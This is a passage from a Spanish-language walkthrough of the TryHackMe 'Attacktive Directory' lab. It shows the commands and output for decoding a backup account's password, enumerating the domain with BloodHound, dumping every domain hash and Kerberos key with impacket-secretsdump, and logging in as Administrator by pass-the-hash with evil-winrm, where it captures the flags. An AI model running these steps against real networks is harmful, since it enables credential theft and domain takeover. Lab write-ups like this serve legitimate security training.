YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw<span class="w">                </span>
</code></pre></div>
<p>Decodificamos el archivo que esta en base64</p>
<div class="highlight"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="w"> </span>
backup@spookysec.local:backup2517860
</code></pre></div>
<h2 id="bloodhoud">Bloodhoud<a class="headerlink" href="#bloodhoud" title="Permanent link">&para;</a></h2>
<p>Con credenciales validas podemos enumerar el sistema con Bloodhoud</p>
<div class="highlight"><pre><span></span><code>bloodhound-python<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;backup&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;backup2517860&#39;</span><span class="w"> </span>-d<span class="w"> </span>spookysec.local<span class="w"> </span>-ns<span class="w"> </span><span class="m">10</span>.201.113.138<span class="w"> </span>-c<span class="w"> </span>All<span class="w"> </span>--zip
INFO:<span class="w"> </span>BloodHound.py<span class="w"> </span><span class="k">for</span><span class="w"> </span>BloodHound<span class="w"> </span>LEGACY<span class="w"> </span><span class="o">(</span>BloodHound<span class="w"> </span><span class="m">4</span>.2<span class="w"> </span>and<span class="w"> </span><span class="m">4</span>.3<span class="o">)</span>
INFO:<span class="w"> </span>Found<span class="w"> </span>AD<span class="w"> </span>domain:<span class="w"> </span>spookysec.local
INFO:<span class="w"> </span>Getting<span class="w"> </span>TGT<span class="w"> </span><span class="k">for</span><span class="w"> </span>user
WARNING:<span class="w"> </span>Failed<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>Kerberos<span class="w"> </span>TGT.<span class="w"> </span>Falling<span class="w"> </span>back<span class="w"> </span>to<span class="w"> </span>NTLM<span class="w"> </span>authentication.<span class="w"> </span>Error:<span class="w"> </span><span class="o">[</span>Errno<span class="w"> </span>Connection<span class="w"> </span>error<span class="w"> </span><span class="o">(</span>attacktivedirectory.spookysec.local:88<span class="o">)]</span><span class="w"> </span><span class="o">[</span>Errno<span class="w"> </span>-2<span class="o">]</span><span class="w"> </span>Name<span class="w"> </span>or<span class="w"> </span>service<span class="w"> </span>not<span class="w"> </span>known
INFO:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>LDAP<span class="w"> </span>server:<span class="w"> </span>attacktivedirectory.spookysec.local
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>domains
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>domains<span class="w"> </span><span class="k">in</span><span class="w"> </span>the<span class="w"> </span>forest
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">1</span><span class="w"> </span>computers
INFO:<span class="w"> </span>Connecting<span class="w"> </span>to<span class="w"> </span>LDAP<span class="w"> </span>server:<span class="w"> </span>attacktivedirectory.spookysec.local
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">18</span><span class="w"> </span>users
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">54</span><span class="w"> </span>groups
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">2</span><span class="w"> </span>gpos
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">3</span><span class="w"> </span>ous
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">21</span><span class="w"> </span>containers
INFO:<span class="w"> </span>Found<span class="w"> </span><span class="m">0</span><span class="w"> </span>trusts
INFO:<span class="w"> </span>Starting<span class="w"> </span>computer<span class="w"> </span>enumeration<span class="w"> </span>with<span class="w"> </span><span class="m">10</span><span class="w"> </span>workers
INFO:<span class="w"> </span>Querying<span class="w"> </span>computer:<span class="w"> </span>AttacktiveDirectory.spookysec.local
INFO:<span class="w"> </span>Ignoring<span class="w"> </span>host<span class="w"> </span>AttacktiveDirectory.spookysec.local<span class="w"> </span>since<span class="w"> </span>its<span class="w"> </span>reported<span class="w"> </span>name<span class="w"> </span>ATTACKTIVEDIREC<span class="w"> </span>does<span class="w"> </span>not<span class="w"> </span>match
INFO:<span class="w"> </span>Done<span class="w"> </span><span class="k">in</span><span class="w"> </span>00M<span class="w"> </span>43S
INFO:<span class="w"> </span>Compressing<span class="w"> </span>output<span class="w"> </span>into<span class="w"> </span>20251004195930_bloodhound.zip
</code></pre></div>
<h2 id="impacket">impacket<a class="headerlink" href="#impacket" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>impacket-secretsdump<span class="w"> </span>spookysec.local/backup:<span class="s1">&#39;backup2517860&#39;</span>@10.201.113.138
Impacket<span class="w"> </span>v0.13.0.dev0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies<span class="w"> </span>

<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>RemoteOperations<span class="w"> </span>failed:<span class="w"> </span>DCERPC<span class="w"> </span>Runtime<span class="w"> </span>Error:<span class="w"> </span>code:<span class="w"> </span>0x5<span class="w"> </span>-<span class="w"> </span>rpc_s_access_denied<span class="w"> </span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Dumping<span class="w"> </span>Domain<span class="w"> </span>Credentials<span class="w"> </span><span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Using<span class="w"> </span>the<span class="w"> </span>DRSUAPI<span class="w"> </span>method<span class="w"> </span>to<span class="w"> </span>get<span class="w"> </span>NTDS.DIT<span class="w"> </span>secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local<span class="se">\s</span>kidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local<span class="se">\b</span>reakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local<span class="se">\j</span>ames:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local<span class="se">\o</span>ptional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local<span class="se">\s</span>herlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local<span class="se">\d</span>arkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local<span class="se">\O</span>ri:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local<span class="se">\r</span>obin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local<span class="se">\p</span>aradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local<span class="se">\M</span>uirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local<span class="se">\h</span>orshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local<span class="se">\s</span>vc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local<span class="se">\b</span>ackup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local<span class="se">\a</span>-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:f8d7323fbad9b7b6560461c8787b2338:::
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Kerberos<span class="w"> </span>keys<span class="w"> </span>grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local<span class="se">\s</span>kidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local<span class="se">\s</span>kidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local<span class="se">\s</span>kidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local<span class="se">\b</span>reakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local<span class="se">\b</span>reakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local<span class="se">\b</span>reakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local<span class="se">\j</span>ames:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local<span class="se">\j</span>ames:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local<span class="se">\j</span>ames:des-cbc-md5:dc971f4a91dce5e9
spookysec.local<span class="se">\o</span>ptional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local<span class="se">\o</span>ptional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local<span class="se">\o</span>ptional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local<span class="se">\s</span>herlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local<span class="se">\s</span>herlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local<span class="se">\s</span>herlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local<span class="se">\d</span>arkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local<span class="se">\d</span>arkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local<span class="se">\d</span>arkstar:des-cbc-md5:758af4d061381cea
spookysec.local<span class="se">\O</span>ri:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local<span class="se">\O</span>ri:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local<span class="se">\O</span>ri:des-cbc-md5:1c8f79864654cd4a
spookysec.local<span class="se">\r</span>obin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local<span class="se">\r</span>obin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local<span class="se">\r</span>obin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local<span class="se">\p</span>aradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local<span class="se">\p</span>aradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local<span class="se">\p</span>aradox:des-cbc-md5:83988983f8b34019
spookysec.local<span class="se">\M</span>uirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local<span class="se">\M</span>uirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local<span class="se">\M</span>uirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local<span class="se">\h</span>orshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local<span class="se">\h</span>orshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local<span class="se">\h</span>orshark:des-cbc-md5:a823497a7f4c0157
spookysec.local<span class="se">\s</span>vc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local<span class="se">\s</span>vc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local<span class="se">\s</span>vc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local<span class="se">\b</span>ackup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local<span class="se">\b</span>ackup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local<span class="se">\b</span>ackup:des-cbc-md5:d601e9469b2f6d89
spookysec.local<span class="se">\a</span>-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local<span class="se">\a</span>-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local<span class="se">\a</span>-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:96ec7afbd0091e45ff94977b5e816e9da65c8673177862bea627e6a1810006e4
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:e223aa7f70cb387a2b6f4dcaf35c59be
ATTACKTIVEDIREC$:des-cbc-md5:4f2052a710fe1f3e
<span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Cleaning<span class="w"> </span>up...<span class="w"> </span>
</code></pre></div>
<p>Nos conectamos con evil winrm</p>
<div class="highlight"><pre><span></span><code>evil-winrm<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;Administrator&#39;</span><span class="w"> </span>-H<span class="w"> </span>0e0363213e37b94221497260b0bcb4fc<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.201.113.138

<span class="w"> </span>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>ocuments&gt;<span class="w"> </span>whoami
thm-ad<span class="se">\a</span>dministrator
</code></pre></div>
<div class="highlight"><pre><span></span><code>*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;<span class="w"> </span>cat<span class="w"> </span>root.txt
TryHackMe<span class="o">{</span>4ctiveD1rectoryM4st3r<span class="o">}</span>

*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\b</span>ackup<span class="se">\D</span>esktop&gt;<span class="w"> </span>cat<span class="w"> </span>PrivEsc.txt
TryHackMe<span class="o">{</span>B4ckM3UpSc0tty!<span class="o">}</span>

*Evil-WinRM*<span class="w"> </span>PS<span class="w"> </span>C:<span class="se">\U</span>sers<span class="se">\s</span>vc-admin<span class="se">\D</span>esktop&gt;<span class="w"> </span>cat<span class="w"> </span>user.txt.txt
TryHackMe<span class="o">{</span>K3rb3r0s_Pr3_4uth<span class="o">}</span>
</code></pre></div>







  
  






                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
    
  </body>
</html>